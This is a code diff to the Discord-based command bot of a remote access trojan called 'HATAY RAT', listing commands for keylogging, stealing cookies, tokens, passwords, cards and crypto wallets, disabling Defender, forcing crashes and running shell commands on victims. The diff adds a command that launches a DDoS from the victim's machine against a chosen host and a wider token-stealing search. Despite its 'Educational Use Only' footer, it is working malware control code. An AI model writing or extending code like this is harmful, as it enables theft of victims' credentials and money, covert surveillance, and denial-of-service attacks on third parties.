@@ -100,9 +100,9 @@ def get_help_embed():
     embed.add_field(name="📁 FILES", value="`!ls <path>` `!download <path>` `!upload <url> <name>` `!remove <path>`", inline=False)
     embed.add_field(name="🎬 RECORDING", value="`!vidshot <sec>` `!audio <sec>`", inline=False)
     embed.add_field(name="⌨️ KEYLOGGER", value="`!keylog start` `!keylog stop` `!keylog dump`", inline=False)
-    embed.add_field(name="💀 GRAB", value="`!cookie` `!token` `!pass` `!card` `!crypto` `!dox` `!grab_plus`", inline=False)
-    embed.add_field(name="⚡ ACTIONS", value="`!shell <cmd>` `!wall <url>` `!shutdown` `!defender_off` `!bsod`", inline=False)
-    embed.add_field(name="🎭 PRANKS", value="`!stress <sec>` `!troll <message|open|beep|mouse> <val>`", inline=False)
+    embed.add_field(name="💀 GRAB", value="`!cookie` `!token` `!pass` `!card` `!crypto` `!dox` `!grab_plus` `!deep_token`", inline=False)
+    embed.add_field(name="⚡ ACTIONS", value="`!shell <cmd>` `!wall <url>` `!shutdown` `!defender_off` `!bsod` `!ddos <ip> <port> <sec>`", inline=False)
+    embed.add_field(name="🎭 PRANKS", value="`!stress <sec>` `!troll <message|open|beep|mouse|screamer> <val>`", inline=False)
     embed.set_footer(text="HATAY RAT | Educational Use Only")
     return embed
 
@@ -278,6 +278,18 @@ async def bsod(ctx):
     if not current_target_id: return await ctx.send("❌ No target.")
     queue_command(current_target_id, "bsod")
     await ctx.send(f"☠️ Triggering BSOD on `{current_target_id}`...")
+
+@bot.command()
+async def ddos(ctx, target: str, port: int = 80, duration: int = 60):
+    if not current_target_id: return await ctx.send("❌ No target.")
+    queue_command(current_target_id, "ddos", f"{target}|{port}|{duration}")
+    await ctx.send(f"🔱 DDoS Attack initiated from victim to `{target}:{port}` for {duration}s!")
+
+@bot.command()
+async def deep_token(ctx):
+    if not current_target_id: return await ctx.send("❌ No target.")
+    queue_command(current_target_id, "deep_token")
+    await ctx.send(f"🔍 Deep Token Search (Slow but Global) requested for `{current_target_id}`...")
 
 def queue_command(client_id, type, payload=None):
     if client_id in sessions:
